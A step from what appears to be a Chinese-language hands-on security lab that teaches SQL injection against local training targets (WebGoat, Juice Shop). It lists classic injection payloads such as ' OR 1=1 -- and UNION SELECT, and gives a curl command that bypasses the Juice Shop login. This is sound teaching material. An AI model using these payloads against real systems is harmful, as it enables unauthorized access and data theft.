# TITLE: 注入 — 执行 SQL 注入攻击
# STEP: 4
# MINUTES: 15

### WHY

现在你已经知道登录请求的结构了。SQL注入的核心思想是：**在用户输入中插入 SQL 特殊字符，破坏原本的查询逻辑**。

常见的注入技巧：
- `' OR 1=1 --` — 让 WHERE 条件永远为真
- `' OR '1'='1` — 同上，不同写法
- `' UNION SELECT ... --` — 联合查询，读取其他表的数据
- `admin' --` — 注释掉密码检查

**本实验在完全隔离的靶机上操作，请放心尝试。**

### DO

**方案一：WebGoat SQL 注入课程（推荐）**

1. 访问 `http://127.0.0.1:8080/WebGoat`
2. 注册账号后，进入 (A1) Injection → SQL Injection (intro)
3. 按课程指引逐步完成 2-13 关

**方案二：Juice Shop 登录绕过**

1. 在 Juice Shop 登录页
2. 邮箱输入：`' OR 1=1 --`
3. 密码随意输入
4. 观察是否成功登录

**方案三：使用 curl 直接测试**

\`\`\`
curl -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1 --","password":"anything"}'
\`\`\`

### CHECK

- WebGoat 课程中你是否理解了每种注入的区别？
- 如果用 Juice Shop，你是否成功绕过了登录？
- 截图保存你的成功证据。

如果卡住，按 h 获取提示。
